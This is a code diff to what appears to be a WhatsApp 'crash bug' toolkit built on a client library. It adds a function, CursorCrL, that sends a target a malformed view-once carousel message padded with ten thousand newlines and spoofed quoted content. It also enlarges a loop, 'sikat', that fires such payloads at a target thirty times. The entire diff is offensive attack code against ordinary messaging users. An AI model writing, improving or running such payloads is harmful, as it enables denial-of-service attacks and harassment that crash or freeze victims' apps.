@@ -884,7 +884,7 @@ async function ForceCallCrL(sock, target) {
                                 url: "https://files.catbox.moe/kst7w4.jpg"
                             },
                             sourceUrl: "about:blank",
-                            sourceId: sock.generateMessageTag(),
+                            //sourceId: sock.generateMessageTag(),
                             ctwaClid: "ctwaClid",
                             ref: "ref",
                             clickToWhatsappCall: true,
@@ -998,6 +998,90 @@ async function iOSxPayload(sock, target) {
         console.error("error:", e);
     }
 }
+
+// HIS FUNCTION 
+async function CursorCrL(sock, target) {
+  const msg = await generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
+        },
+        interactiveMessage: {
+          body: { 
+            text: '' 
+          },
+          footer: { 
+            text: '' 
+          },
+          carouselMessage: {
+            cards: [
+              {               
+                header: {
+                  title: '-',
+                  imageMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
+                    mimetype: "image/jpeg",
+                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
+                    fileLength: "164089",
+                    height: 1,
+                    width: 1,
+                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
+                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
+                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
+                    mediaKeyTimestamp: "1749172037",
+                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
+                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
+                    scanLengths: [8596, 155493]
+                  },
+                  hasMediaAttachment: true, 
+                },
+                body: { 
+                  text: "-"
+                },
+                footer: {
+                  text: "phynx.json"
+                },
+                nativeFlowMessage: {
+                  messageParamsJson: "\n".repeat(10000) 
+                }
+              }
+            ]
+          },
+          contextInfo: {
+            participant: "0@s.whatsapp.net",             
+            quotedMessage: {
+              viewOnceMessage: {
+                message: {
+                  interactiveResponseMessage: {
+                    body: {
+                      text: "Sent",
+                      format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                      name: "galaxy_message",
+                      paramsJson: "{ phynx.json }",
+                      version: 3
+                    }
+                  }
+                }
+              }
+            },
+            remoteJid: "@s.whatsapp.net"
+          }
+        }
+      }
+    }
+  }, {});
+
+  await sock.relayMessage(target, msg.message, {
+    participant: { jid: target },
+    messageId: msg.key.id
+  });
+  console.log(`Successfully Send CursorCrl to ${target}`)
+}
+
 // CASE 
 
 /* 
@@ -1043,9 +1127,10 @@ async function BH3(sock, target) {
     }
 }
 async function sikat(sock, target) {
-    for (let i = 0; i < 10; i++) {
+    for (let i = 0; i < 30; i++) {
         //await AB1(sock, target, true)
         //await AB2(sock, target, true)
+        await ForceCallCrL(sock, target)
         await F(sock, target)
         console.log(`${i} sikat Packet To ${target}`)
     }
@@ -1067,5 +1152,6 @@ module.exports = {
     ForceCallCrL,
     iOSxContact,
     iOSxPayload,
+    CursorCrL,
     sikat
 }
